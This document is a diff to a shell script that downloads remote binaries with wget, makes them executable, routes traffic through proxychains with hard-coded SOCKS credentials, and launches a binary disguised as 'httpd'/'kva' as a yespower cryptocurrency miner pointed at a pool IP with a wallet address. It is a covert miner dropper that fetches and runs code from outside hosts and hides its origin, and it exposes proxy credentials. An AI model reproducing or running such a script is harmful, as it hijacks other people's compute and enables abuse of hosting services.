@@ -1,8 +1,8 @@
-proxy="3.227.182.193" 
+proxy="us-east-static-08.quotaguard.com" 
 port="1080" 
 user="425dlrn5kpryex"  
 pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
-git clone https://github.com/55113110159/apikey.git>/dev/null && cd apikey && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo
+wget -q -O kva https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x kva
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./zepo -c "config.json" 
+./panel ./kva -a yespower -o 103.120.19.136:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-0 -n 1)dikamahesa) --timeout 120 -p x --proxy socks5://425dlrn5kpryex:x2mzz8lq69wgze6pe2bcqg668ze9@us-east-static-08.quotaguard.com:1080 c=SWAMP,mc=VHH  
